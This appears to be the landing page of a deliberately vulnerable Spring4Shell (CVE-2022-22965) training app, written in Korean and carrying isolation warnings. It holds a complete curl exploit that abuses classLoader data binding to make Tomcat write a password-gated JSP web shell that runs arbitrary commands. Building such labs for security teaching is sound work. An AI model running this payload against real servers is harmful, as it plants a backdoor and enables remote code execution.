<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Spring4Shell Vulnerable Application</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 900px;
            margin: 50px auto;
            padding: 20px;
            background-color: #f5f5f5;
        }
        .container {
            background-color: white;
            padding: 40px;
            border-radius: 5px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }
        h1 {
            color: #dc3545;
            border-bottom: 2px solid #dc3545;
            padding-bottom: 10px;
        }
        .warning-box {
            background-color: #fff3cd;
            border-left: 4px solid #ffc107;
            padding: 20px;
            margin: 20px 0;
        }
        .danger-box {
            background-color: #f8d7da;
            border-left: 4px solid #dc3545;
            padding: 20px;
            margin: 20px 0;
        }
        .info-box {
            background-color: #d1ecf1;
            border-left: 4px solid #17a2b8;
            padding: 20px;
            margin: 20px 0;
        }
        ul {
            line-height: 1.8;
        }
        .endpoints {
            margin: 30px 0;
        }
        .endpoint-link {
            display: inline-block;
            background-color: #007bff;
            color: white;
            padding: 12px 24px;
            margin: 10px 10px 10px 0;
            text-decoration: none;
            border-radius: 4px;
        }
        .endpoint-link:hover {
            background-color: #0056b3;
        }
        code {
            background-color: #f5f5f5;
            padding: 2px 6px;
            border-radius: 3px;
            font-family: 'Courier New', monospace;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>⚠️ Spring4Shell (CVE-2022-22965) Vulnerable Application</h1>

        <div class="danger-box">
            <h2>🔴 중대한 경고</h2>
            <p><strong>이 애플리케이션은 의도적으로 취약하게 만들어졌습니다!</strong></p>
            <ul>
                <li>교육 및 보안 테스트 목적으로만 사용하세요</li>
                <li>격리된 환경에서만 실행하세요</li>
                <li>절대로 프로덕션 환경이나 공개 네트워크에 배포하지 마세요</li>
                <li>테스트 후 즉시 종료하세요</li>
            </ul>
        </div>

        <div class="info-box">
            <h2>📋 프로젝트 정보</h2>
            <ul>
                <li><strong>취약점:</strong> Spring4Shell (CVE-2022-22965)</li>
                <li><strong>Spring Framework 버전:</strong> 5.1.2 (취약)</li>
                <li><strong>JDK 요구사항:</strong> JDK 11</li>
                <li><strong>배포 방식:</strong> WAR (외부 Tomcat)</li>
            </ul>
        </div>

        <div class="warning-box">
            <h2>🛡️ 취약점 개요</h2>
            <p>Spring4Shell은 Spring Framework의 데이터 바인딩 메커니즘을 악용하는 원격 코드 실행(RCE) 취약점입니다.</p>
            <p>공격자는 <code>class.module.classLoader</code> 경로를 통해 Tomcat의 내부 설정을 조작하여 악의적인 JSP 파일을 생성할 수 있습니다.</p>
        </div>

        <h2>🔗 취약한 엔드포인트</h2>
        <div class="endpoints">
            <a href="<%= request.getContextPath() %>/greeting" class="endpoint-link">Greeting Form (GET)</a>
            <a href="<%= request.getContextPath() %>/test" class="endpoint-link">Test Form (GET)</a>
        </div>

        <h2>🧪 공격 테스트 방법</h2>
        <p>다음 curl 명령을 사용하여 Spring4Shell 취약점을 테스트할 수 있습니다:</p>
        <pre style="background-color: #2d2d2d; color: #f8f8f2; padding: 20px; overflow-x: auto; border-radius: 4px; font-size: 12px;">
curl "http://localhost:8080<%= request.getContextPath() %>/greeting?\
class.module.classLoader.resources.context.parent.pipeline.first.pattern=\
%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20\
java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().\
exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20\
byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20\
out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&\
class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&\
class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&\
class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell&\
class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="
        </pre>

        <p style="margin-top: 20px;">성공하면 <code>webapps/ROOT/shell.jsp</code> 파일이 생성됩니다.</p>

        <h2>📚 추가 정보</h2>
        <ul>
            <li>CVE ID: <a href="https://nvd.nist.gov/vuln/detail/CVE-2022-22965" target="_blank">CVE-2022-22965</a></li>
            <li>발견일: 2022년 3월 31일</li>
            <li>CVSS Score: 9.8 (Critical)</li>
        </ul>
    </div>
</body>
</html>
